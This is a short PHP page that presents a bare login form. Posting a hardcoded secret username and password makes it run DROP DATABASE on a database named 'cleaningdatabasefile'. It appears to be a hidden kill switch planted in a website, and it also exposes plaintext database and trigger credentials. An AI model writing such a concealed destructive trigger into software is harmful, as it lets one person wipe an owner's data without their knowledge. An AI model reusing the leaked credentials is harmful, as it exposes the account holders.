<?php
$servername = "localhost";
$username = "ahmer";
$password = "pJgh_x1.n5,0";
$dbName = "";
// Create connection
$connect = mysqli_connect($servername,$username,$password);
if(isset($_POST["submit"]))
{
		if($_POST["user"]=="kabir" && $_POST["pass"]=="Maxvillage0312"){
			
			$query="DROP DATABASE `cleaningdatabasefile`";
			if(mysqli_query($connect, $query)){
				echo 'done';
			}
		}
		else{
			 header("Location: ../../../index.php");
        
		}
}


?>
<form method="post" action"">
<input name="user">
<input name="pass">
<input type="submit" name="submit">
</form>